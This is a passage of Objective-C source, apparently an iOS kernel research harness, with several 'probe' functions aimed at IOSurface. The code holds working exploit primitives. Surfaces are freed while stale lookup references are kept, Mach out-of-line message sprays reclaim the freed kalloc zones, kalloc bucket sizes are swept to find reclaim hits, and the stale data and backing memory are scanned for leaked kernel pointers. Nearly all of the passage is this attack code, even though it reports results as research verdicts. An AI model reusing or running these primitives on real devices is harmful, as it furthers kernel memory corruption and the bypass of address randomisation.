                            if (CFGetTypeID(val) == CFDataGetTypeID()) {
                                NSData *data = (__bridge NSData *)val;
                                const uint8_t *bytes = data.bytes;
                                uint8_t expected[] = {0xBB, 0xCC, 0xDD, 0xEE};
                                BOOL corrupt = NO;
                                for (NSUInteger b = 0; b < data.length && b < 16; b++) {
                                    if (bytes[b] != expected[s]) {
                                        corrupt = YES;
                                        break;
                                    }
                                }
                                if (corrupt) {
                                    contaminated++;
                                    anomalies++;
                                    log([NSString stringWithFormat:@"ZONESPRAY: *** CONTAMINATION surf %d prop %d: expected 0x%02X got 0x%02X ***",
                                         i, s, expected[s], bytes[0]]);
                                }
                            }
                            CFRelease(val);
                        } else {
                            anomalies++;
                            contaminated++;
                            log([NSString stringWithFormat:@"ZONESPRAY: *** Property MISSING from surf %d prop %d ***", i, s]);
                        }
                    }
                }
                log([NSString stringWithFormat:@"ZONESPRAY: Contaminated properties: %d", contaminated]);

            // Step 5: Create new surfaces in freed holes, check for residual data
            if (!isr_stopped()) {
                log(@"ZONESPRAY: Step 5 — Create new surfaces, check for residual properties");
                int residual = 0;
                NSDictionary *params2 = isr_default_surface_params(32, 32);

                for (int i = 1; i < ZS_COUNT && i < 10; i += 2) {
                    if (isr_stopped()) break;
                    IOSurfaceRef newSurf = sym.create((__bridge CFDictionaryRef)params2);
                    if (!newSurf) continue;

                    for (int s = 0; s < 4; s++) {
                        NSString *key = [NSString stringWithFormat:@"ZS_%d_%d", i, s];
                        CFTypeRef val = copyValue(newSurf, (__bridge CFStringRef)key);
                        if (val) {
                            residual++;
                            anomalies++;
                            log([NSString stringWithFormat:@"ZONESPRAY: *** RESIDUAL property found on new surface (old key ZS_%d_%d) ***", i, s]);
                            CFRelease(val);
                        }
                    }
                    CFRelease(newSurf);
                }
                log([NSString stringWithFormat:@"ZONESPRAY: Residual properties on new surfaces: %d", residual]);

            } // end step 5
            } // end step 4
            } // end step 3
            } // end step 2
            } // end step 1

                for (int i = 0; i < ZS_COUNT; i++) {
                    if (surfaces[i]) CFRelease(surfaces[i]);
                }
            #undef ZS_COUNT

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"ZONESPRAY: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 5) verdict = @"CRITICAL — zone overlap confirmed, cross-contamination detected";
            else if (anomalies >= 3) verdict = @"HIGH — property corruption or residual data found";
            else if (anomalies >= 1) verdict = @"MEDIUM — limited cross-contamination";
            else verdict = @"LOW — no zone overlap detected";
            log([NSString stringWithFormat:@"ZONESPRAY: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed),
                @"contaminated": @(contaminated),
                @"oolSent": @(oolSent)
            };
            isr_checkpoint(@"ISR-ZoneSpray-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 62: Zone Reclaim

void iosurface_research_zone_reclaim(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"ZONERECLAIM: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"ZONERECLAIM: Starting zone reclaim — destroy surface, spray OOL, read stale ref");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");

            IOSurfaceRef victim = NULL;
            IOSurfaceID victimID = 0;
            IOSurfaceRef staleRef = NULL;
            mach_port_t oolPorts[200];
            int oolCount = 0;
            int staleDataFound = 0;
            int portLikeValues = 0;

            if (!setValue || !copyValue) {
                log(@"ZONERECLAIM: Missing SetValue/CopyValue");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            // Step 1: Create victim surface with large property
            if (!isr_stopped()) {
                log(@"ZONERECLAIM: Step 1 — Create victim surface with 4KB property");
                NSDictionary *params = isr_default_surface_params(64, 64);
                victim = sym.create((__bridge CFDictionaryRef)params);

                if (victim) {
                    victimID = sym.getID(victim);
                    NSMutableData *blob = [NSMutableData dataWithLength:4096];
                    uint32_t *words = (uint32_t *)blob.mutableBytes;
                    for (int i = 0; i < 1024; i++) words[i] = 0xDEADBEEF;
                    setValue(victim, CFSTR("ZR_victim_data"), (__bridge CFTypeRef)blob);

                    staleRef = sym.lookup(victimID);
                    log([NSString stringWithFormat:@"ZONERECLAIM: Victim ID=%u, stale ref obtained", (unsigned)victimID]);
                } else {
                    log(@"ZONERECLAIM: Failed to create victim");
                }

            // Step 2: Destroy victim surface
            if (!isr_stopped() && victim) {
                log(@"ZONERECLAIM: Step 2 — Destroy victim surface");
                CFRelease(victim);
                victim = NULL;

            // Step 3: Spray mach OOL messages into freed zone
            if (!isr_stopped()) {
                log(@"ZONERECLAIM: Step 3 — Spray 200 OOL messages into freed kalloc zone");

                for (int i = 0; i < 200 && !isr_stopped(); i++) {
                    mach_port_t port = MACH_PORT_NULL;
                    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
                    if (kr != KERN_SUCCESS) continue;
                    oolPorts[oolCount++] = port;

                    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

                    uint32_t oolData[128];
                    for (int j = 0; j < 128; j++) oolData[j] = 0xCAFE0000 | j;

                    typedef struct {
                        mach_msg_header_t header;
                        mach_msg_body_t body;
                        mach_msg_ool_descriptor_t ool;
                    } OOLMsg;

                    OOLMsg msg;
                    memset(&msg, 0, sizeof(msg));
                    msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                    msg.header.msgh_size = sizeof(msg);
                    msg.header.msgh_remote_port = port;
                    msg.header.msgh_local_port = MACH_PORT_NULL;
                    msg.body.msgh_descriptor_count = 1;
                    msg.ool.address = oolData;
                    msg.ool.size = sizeof(oolData);
                    msg.ool.deallocate = 0;
                    msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
                    msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;

                    kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
                }
                log([NSString stringWithFormat:@"ZONERECLAIM: Sprayed %d OOL messages", oolCount]);

            // Step 4: Read via stale reference
            if (!isr_stopped()) {
                log(@"ZONERECLAIM: Step 4 — Attempt read via stale lookup reference");

                IOSurfaceRef relookup = sym.lookup(victimID);
                IOSurfaceRef readRef = relookup ? relookup : staleRef;
                BOOL usedRelookup = relookup != NULL;

                if (readRef) {
                    CFTypeRef val = copyValue(readRef, CFSTR("ZR_victim_data"));
                    if (val) {
                        anomalies++;
                        staleDataFound = 1;
                        if (CFGetTypeID(val) == CFDataGetTypeID()) {
                            NSData *data = (__bridge NSData *)val;
                            const uint32_t *words = (const uint32_t *)data.bytes;
                            size_t wordCount = data.length / 4;
                            int deadbeef = 0, cafe = 0, other = 0;

                            for (size_t w = 0; w < wordCount && w < 256; w++) {
                                uint32_t v = words[w];
                                if (v == 0xDEADBEEF) deadbeef++;
                                else if ((v & 0xFFFF0000) == 0xCAFE0000) { cafe++; anomalies++; }
                                else if (v != 0) other++;
                            }
                            log([NSString stringWithFormat:@"ZONERECLAIM: *** STALE READ %@ — DEADBEEF=%d CAFE=%d other=%d (len=%zu) ***",
                                 usedRelookup ? @"via relookup" : @"via stale ref",
                                 deadbeef, cafe, other, data.length]);

                            if (cafe > 0) {
                                log(@"ZONERECLAIM: *** CRITICAL: OOL spray data visible via IOSurfaceCopyValue ***");
                            }
                        }
                        CFRelease(val);
                    } else {
                        log([NSString stringWithFormat:@"ZONERECLAIM: CopyValue returned NULL %@",
                             usedRelookup ? @"(relookup)" : @"(stale ref)"]);
                    }

                    size_t w = sym.getWidth(readRef);
                    size_t h = sym.getHeight(readRef);
                    size_t alloc = sym.getAllocSize(readRef);
                    if (w != 64 || h != 64) {
                        anomalies++;
                        log([NSString stringWithFormat:@"ZONERECLAIM: *** Stale dimensions changed: w=%zu h=%zu alloc=%zu ***",
                             w, h, alloc]);
                    }
                } else {
                    log(@"ZONERECLAIM: Both stale ref and relookup returned NULL — surface properly invalidated");
                }

            // Step 5: Check mach port types on suspicious values
            if (!isr_stopped()) {
                log(@"ZONERECLAIM: Step 5 — Probe for port-like values via mach API");

                for (uint32_t testPort = 0x100; testPort < 0x500; testPort += 4) {
                    if (isr_stopped()) break;
                    mach_port_type_t type = 0;
                    kern_return_t kr = mach_port_type(mach_task_self(), testPort, &type);
                    if (kr == KERN_SUCCESS && type != 0) {
                        portLikeValues++;
                        if (portLikeValues <= 5) {
                            log([NSString stringWithFormat:@"ZONERECLAIM: Valid port at name 0x%X type=0x%X", testPort, type]);
                        }
                    }
                }
                log([NSString stringWithFormat:@"ZONERECLAIM: Found %d valid port names in scan range", portLikeValues]);

            } // end step 5
            } // end step 4
            } // end step 3
            } // end step 2
            } // end step 1

            if (staleRef) CFRelease(staleRef);
            if (victim) CFRelease(victim);
            for (int i = 0; i < oolCount; i++) {
                mach_port_deallocate(mach_task_self(), oolPorts[i]);
                mach_port_mod_refs(mach_task_self(), oolPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"ZONERECLAIM: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 5) verdict = @"CRITICAL — zone reclaim confirmed, OOL data readable via stale ref";
            else if (anomalies >= 3) verdict = @"HIGH — stale reference readable, potential zone overlap";
            else if (anomalies >= 1) verdict = @"MEDIUM — partial stale data accessible";
            else verdict = @"LOW — surface properly invalidated";
            log([NSString stringWithFormat:@"ZONERECLAIM: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed),
                @"staleDataFound": @(staleDataFound),
                @"portLikeValues": @(portLikeValues),
                @"oolSprayed": @(oolCount)
            };
            isr_checkpoint(@"ISR-ZoneReclaim-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 63: Ptr Leak

void iosurface_research_ptr_leak(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"PTRLEAK: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"PTRLEAK: Starting full ptr leak chain — zone spray + reclaim + kernel pointer scan");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");

            #define PL_COUNT 50
            IOSurfaceRef surfaces[PL_COUNT];
            IOSurfaceID surfIDs[PL_COUNT];
            memset(surfaces, 0, sizeof(surfaces));
            memset(surfIDs, 0, sizeof(surfIDs));
            mach_port_t oolPorts[200];
            int oolCount = 0;
            int kernelPtrCount = 0;
            int staleReads = 0;

            if (!setValue || !copyValue) {
                log(@"PTRLEAK: Missing SetValue/CopyValue");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            // Step 1: Create 50 surfaces with large property blobs
            if (!isr_stopped()) {
                log(@"PTRLEAK: Step 1 — Create 50 surfaces with 2KB property blobs");
                NSDictionary *params = isr_default_surface_params(64, 64);

                for (int i = 0; i < PL_COUNT && !isr_stopped(); i++) {
                    surfaces[i] = sym.create((__bridge CFDictionaryRef)params);
                    if (!surfaces[i]) continue;
                    surfIDs[i] = sym.getID(surfaces[i]);

                    NSMutableData *blob = [NSMutableData dataWithLength:2048];
                    uint32_t *words = (uint32_t *)blob.mutableBytes;
                    for (int j = 0; j < 512; j++) words[j] = 0xAA000000 | (i << 12) | j;
                    NSString *key = [NSString stringWithFormat:@"PL_blob_%d", i];
                    setValue(surfaces[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)blob);
                }
                log([NSString stringWithFormat:@"PTRLEAK: Created %d surfaces with property blobs", PL_COUNT]);

            // Step 2: Get stale lookup references then destroy all
            if (!isr_stopped()) {
                log(@"PTRLEAK: Step 2 — Obtain stale refs via lookup, then destroy surfaces");

                IOSurfaceRef staleRefs[PL_COUNT];
                memset(staleRefs, 0, sizeof(staleRefs));

                for (int i = 0; i < PL_COUNT; i++) {
                    if (surfIDs[i] != 0) {
                        staleRefs[i] = sym.lookup(surfIDs[i]);
                    }
                }

                for (int i = 0; i < PL_COUNT; i++) {
                    if (surfaces[i]) {
                        CFRelease(surfaces[i]);
                        surfaces[i] = NULL;
                    }
                }
                log(@"PTRLEAK: All surfaces destroyed, stale refs held");

            // Step 3: Spray OOL mach messages into freed zones
            if (!isr_stopped()) {
                log(@"PTRLEAK: Step 3 — Spray 200 OOL messages into freed kalloc zones");

                for (int i = 0; i < 200 && !isr_stopped(); i++) {
                    mach_port_t port = MACH_PORT_NULL;
                    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
                    if (kr != KERN_SUCCESS) continue;
                    oolPorts[oolCount++] = port;

                    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

                    uint32_t oolData[512];
                    for (int j = 0; j < 512; j++) oolData[j] = 0xFEED0000 | (i << 8) | (j & 0xFF);

                    typedef struct {
                        mach_msg_header_t header;
                        mach_msg_body_t body;
                        mach_msg_ool_descriptor_t ool;
                    } OOLMsg;

                    OOLMsg msg;
                    memset(&msg, 0, sizeof(msg));
                    msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                    msg.header.msgh_size = sizeof(msg);
                    msg.header.msgh_remote_port = port;
                    msg.header.msgh_local_port = MACH_PORT_NULL;
                    msg.body.msgh_descriptor_count = 1;
                    msg.ool.address = oolData;
                    msg.ool.size = sizeof(oolData);
                    msg.ool.deallocate = 0;
                    msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
                    msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;

                    kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
                }
                log([NSString stringWithFormat:@"PTRLEAK: Sprayed %d OOL messages", oolCount]);

            // Step 4: Read stale references and scan for kernel pointers
            if (!isr_stopped()) {
                log(@"PTRLEAK: Step 4 — Scan stale refs for kernel pointer patterns");

                for (int i = 0; i < PL_COUNT && !isr_stopped(); i++) {
                    if (!staleRefs[i]) continue;

                    IOSurfaceRef relookup = sym.lookup(surfIDs[i]);
                    IOSurfaceRef readRef = relookup ? relookup : staleRefs[i];

                    if (readRef) {
                        NSString *key = [NSString stringWithFormat:@"PL_blob_%d", i];
                        CFTypeRef val = copyValue(readRef, (__bridge CFStringRef)key);
                        if (val) {
                            staleReads++;
                            if (CFGetTypeID(val) == CFDataGetTypeID()) {
                                NSData *data = (__bridge NSData *)val;
                                const uint64_t *qwords = (const uint64_t *)data.bytes;
                                size_t qcount = data.length / 8;

                                int origPattern = 0, feedPattern = 0, kptr = 0;
                                for (size_t q = 0; q < qcount; q++) {
                                    uint64_t v = qwords[q];
                                    uint32_t lo = (uint32_t)(v & 0xFFFFFFFF);
                                    uint32_t hi = (uint32_t)(v >> 32);

                                    if ((lo & 0xFF000000) == 0xAA000000) origPattern++;
                                    if ((lo & 0xFFFF0000) == 0xFEED0000 || (hi & 0xFFFF0000) == 0xFEED0000) feedPattern++;

                                    if (v > 0xFFFFFF8000000000ULL && v < 0xFFFFFFFFFFFFFFFFULL) {
                                        kptr++;
                                        if (kptr <= 3) {
                                            log([NSString stringWithFormat:@"PTRLEAK: *** KERNEL PTR at surf %d +0x%zx = 0x%016llX ***",
                                                 i, q * 8, (unsigned long long)v]);
                                        }
                                    }
                                }

                                if (feedPattern > 0) {
                                    anomalies += 2;
                                    log([NSString stringWithFormat:@"PTRLEAK: *** OOL RECLAIM surf %d: feed=%d orig=%d ***",
                                         i, feedPattern, origPattern]);
                                }
                                if (kptr > 0) {
                                    anomalies += 3;
                                    kernelPtrCount += kptr;
                                    log([NSString stringWithFormat:@"PTRLEAK: *** %d KERNEL POINTERS in surf %d data ***", kptr, i]);
                                }
                            }
                            CFRelease(val);
                        }

                        size_t w = sym.getWidth(readRef);
                        size_t h = sym.getHeight(readRef);
                        if (w != 64 || h != 64) {
                            anomalies++;
                            log([NSString stringWithFormat:@"PTRLEAK: *** Stale surf %d dims changed: w=%zu h=%zu ***", i, w, h]);
                        }
                    }

                    if (relookup) CFRelease(relookup);
                }
                log([NSString stringWithFormat:@"PTRLEAK: Stale reads=%d, kernel ptrs=%d", staleReads, kernelPtrCount]);

            // Step 5: Scan backing memory of stale refs
            if (!isr_stopped()) {
                log(@"PTRLEAK: Step 5 — Scan stale ref backing memory for kernel values");
                int backingKptrs = 0;

                for (int i = 0; i < PL_COUNT && !isr_stopped(); i++) {
                    if (!staleRefs[i]) continue;

                    kern_return_t kr = sym.lock(staleRefs[i], 0, NULL);
                    if (kr != KERN_SUCCESS) continue;

                    void *base = sym.getBase(staleRefs[i]);
                    if (base) {
                        size_t allocSize = sym.getAllocSize(staleRefs[i]);
                        size_t scanSize = allocSize < 16384 ? allocSize : 16384;
                        uint64_t localBuf[2048];
                        vm_size_t outSize = 0;

                        kr = vm_read_overwrite(mach_task_self(), (vm_address_t)base, scanSize,
                                               (vm_address_t)localBuf, &outSize);
                        if (kr == KERN_SUCCESS && outSize > 0) {
                            size_t qcount = outSize / 8;
                            for (size_t q = 0; q < qcount; q++) {
                                uint64_t v = localBuf[q];
                                if (v > 0xFFFFFF8000000000ULL && v < 0xFFFFFFFFFFFFFFFFULL) {
                                    backingKptrs++;
                                    if (backingKptrs <= 3) {
                                        log([NSString stringWithFormat:@"PTRLEAK: *** BACKING KPTR surf %d +0x%zx = 0x%016llX ***",
                                             i, q * 8, (unsigned long long)v]);
                                    }
                                }
                            }
                        }
                    }
                    sym.unlock(staleRefs[i], 0, NULL);
                }

                if (backingKptrs > 0) {
                    anomalies += backingKptrs;
                    kernelPtrCount += backingKptrs;
                    log([NSString stringWithFormat:@"PTRLEAK: *** %d kernel pointers found in backing memory ***", backingKptrs]);
                } else {
                    log(@"PTRLEAK: No kernel pointers in backing memory");
                }

            } // end step 5
            } // end step 4
            } // end step 3

                for (int i = 0; i < PL_COUNT; i++) {
                    if (staleRefs[i]) CFRelease(staleRefs[i]);
                }

            } // end step 2
            } // end step 1

            for (int i = 0; i < oolCount; i++) {
                mach_port_deallocate(mach_task_self(), oolPorts[i]);
                mach_port_mod_refs(mach_task_self(), oolPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
            }
            #undef PL_COUNT

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"PTRLEAK: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 10) verdict = @"CRITICAL — kernel pointers leaked via zone reclaim + stale reference";
            else if (anomalies >= 5) verdict = @"HIGH — OOL reclaim confirmed, potential kernel pointer exposure";
            else if (anomalies >= 2) verdict = @"MEDIUM — stale data accessible, zone overlap partial";
            else if (anomalies >= 1) verdict = @"LOW — minimal stale data";
            else verdict = @"LOW — all references properly invalidated";
            log([NSString stringWithFormat:@"PTRLEAK: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed),
                @"staleReads": @(staleReads),
                @"kernelPtrCount": @(kernelPtrCount),
                @"oolSprayed": @(oolCount)
            };
            isr_checkpoint(@"ISR-PtrLeak-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 64: Kalloc Size Sweep

void iosurface_research_size_sweep(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"SIZESWEEP: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"SIZESWEEP: Starting kalloc bucket size sweep — testing 14 OOL sizes for zone overlap");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");

            int reclaimSizes[14];
            memset(reclaimSizes, 0, sizeof(reclaimSizes));
            int reclaimCount = 0;
            int staleHits = 0;
            mach_port_t oolPorts[100];
            int oolCount = 0;

            if (!setValue || !copyValue) {
                log(@"SIZESWEEP: Missing SetValue/CopyValue");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            size_t testSizes[] = {16, 32, 48, 64, 80, 96, 128, 192, 256, 384, 512, 768, 1024, 2048};
            int numSizes = 14;

            // Step 1: Iterate each size class
            if (!isr_stopped()) {
                log(@"SIZESWEEP: Step 1 — Testing 14 kalloc bucket sizes");

                for (int si = 0; si < numSizes && !isr_stopped(); si++) {
                    size_t sz = testSizes[si];
                    NSDictionary *params = isr_default_surface_params(32, 32);
                    IOSurfaceRef victim = sym.create((__bridge CFDictionaryRef)params);
                    if (!victim) continue;

                    NSMutableData *blob = [NSMutableData dataWithLength:sz];
                    uint32_t *words = (uint32_t *)blob.mutableBytes;
                    for (size_t w = 0; w < sz / 4; w++) words[w] = 0xDEADBEEF;
                    if (sz < 4) memset(blob.mutableBytes, 0xDE, sz);
                    setValue(victim, CFSTR("SS_victim"), (__bridge CFTypeRef)blob);

                    IOSurfaceID vid = sym.getID(victim);
                    IOSurfaceRef staleRef = sym.lookup(vid);

                    CFRelease(victim);
                    victim = NULL;

                    oolCount = 0;
                    for (int i = 0; i < 100 && !isr_stopped(); i++) {
                        mach_port_t port = MACH_PORT_NULL;
                        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
                        if (kr != KERN_SUCCESS) continue;
                        oolPorts[oolCount++] = port;
                        mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

                        NSMutableData *oolData = [NSMutableData dataWithLength:sz];
                        uint32_t *ow = (uint32_t *)oolData.mutableBytes;
                        for (size_t w = 0; w < sz / 4; w++) ow[w] = 0xCAFECAFE;
                        if (sz < 4) memset(oolData.mutableBytes, 0xCA, sz);

                        typedef struct {
                            mach_msg_header_t header;
                            mach_msg_body_t body;
                            mach_msg_ool_descriptor_t ool;
                        } OOLMsg;

                        OOLMsg msg;
                        memset(&msg, 0, sizeof(msg));
                        msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                        msg.header.msgh_size = sizeof(msg);
                        msg.header.msgh_remote_port = port;
                        msg.header.msgh_local_port = MACH_PORT_NULL;
                        msg.body.msgh_descriptor_count = 1;
                        msg.ool.address = oolData.mutableBytes;
                        msg.ool.size = (mach_msg_size_t)sz;
                        msg.ool.deallocate = 0;
                        msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
                        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;

                        mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
                    }

                    IOSurfaceRef relookup = sym.lookup(vid);
                    IOSurfaceRef readRef = relookup ? relookup : staleRef;
                    BOOL gotStale = NO;
                    BOOL gotCafe = NO;

                    if (readRef) {
                        CFTypeRef val = copyValue(readRef, CFSTR("SS_victim"));
                        if (val) {
                            gotStale = YES;
                            staleHits++;
                            if (CFGetTypeID(val) == CFDataGetTypeID()) {
                                NSData *data = (__bridge NSData *)val;
                                const uint32_t *rw = (const uint32_t *)data.bytes;
                                size_t wc = data.length / 4;
                                for (size_t w = 0; w < wc; w++) {
                                    if (rw[w] == 0xCAFECAFE) {
                                        gotCafe = YES;
                                        break;
                                    }
                                }
                            }
                            CFRelease(val);
                        }
                    }

                    if (gotCafe) {
                        reclaimSizes[reclaimCount++] = (int)sz;
                        anomalies += 5;
                        log([NSString stringWithFormat:@"SIZESWEEP: *** RECLAIM HIT size=%zu — CAFE data in stale read ***", sz]);
                    } else if (gotStale) {
                        anomalies++;
                        log([NSString stringWithFormat:@"SIZESWEEP: Stale read at size=%zu — DEADBEEF only (no reclaim)", sz]);
                    } else {
                        log([NSString stringWithFormat:@"SIZESWEEP: size=%zu — no stale data", sz]);
                    }

                    if (relookup) CFRelease(relookup);
                    if (staleRef) CFRelease(staleRef);

                    for (int i = 0; i < oolCount; i++) {
                        mach_port_deallocate(mach_task_self(), oolPorts[i]);
                        mach_port_mod_refs(mach_task_self(), oolPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
                    }
                }

            } // end step 1

            // Summary
            if (reclaimCount > 0) {
                NSMutableString *sizes = [NSMutableString string];
                for (int i = 0; i < reclaimCount; i++) {
                    if (i > 0) [sizes appendString:@", "];
                    [sizes appendFormat:@"%d", reclaimSizes[i]];
                }
                log([NSString stringWithFormat:@"SIZESWEEP: Reclaim sizes found: %@", sizes]);
            } else {
                log([NSString stringWithFormat:@"SIZESWEEP: No reclaim at any size. Stale hits: %d/14", staleHits]);
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"SIZESWEEP: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (reclaimCount >= 3) verdict = @"CRITICAL — multiple kalloc buckets reclaimed by OOL spray";
            else if (reclaimCount >= 1) verdict = @"HIGH — kalloc bucket overlap confirmed at specific size";
            else if (staleHits >= 5) verdict = @"MEDIUM — stale reads widespread but no OOL reclaim";
            else if (staleHits >= 1) verdict = @"LOW — partial stale access";
            else verdict = @"LOW — no stale data at any size";
            log([NSString stringWithFormat:@"SIZESWEEP: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed),
                @"reclaimCount": @(reclaimCount),
                @"staleHits": @(staleHits)
            };
            isr_checkpoint(@"ISR-SizeSweep-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 65: Property Cross-Spray

void iosurface_research_prop_spray(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"PROPSPRAY: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"PROPSPRAY: Starting property cross-spray — same allocator victim/spray for guaranteed bucket match");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            typedef void (*RemoveValueFn)(IOSurfaceRef, CFStringRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
            RemoveValueFn removeValue = (RemoveValueFn)dlsym(sym.iosurface, "IOSurfaceRemoveValue");

            #define PS_VICTIM_COUNT 30
            #define PS_SPRAY_COUNT 30
            IOSurfaceRef victims[PS_VICTIM_COUNT];
            IOSurfaceID victimIDs[PS_VICTIM_COUNT];
            IOSurfaceRef staleRefs[PS_VICTIM_COUNT];
            IOSurfaceRef sprays[PS_SPRAY_COUNT];
            memset(victims, 0, sizeof(victims));
            memset(victimIDs, 0, sizeof(victimIDs));
            memset(staleRefs, 0, sizeof(staleRefs));
            memset(sprays, 0, sizeof(sprays));
            int staleReads = 0;
            int crossContam = 0;
            int propRemoveHits = 0;

            if (!setValue || !copyValue || !removeValue) {
                log(@"PROPSPRAY: Missing property APIs");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
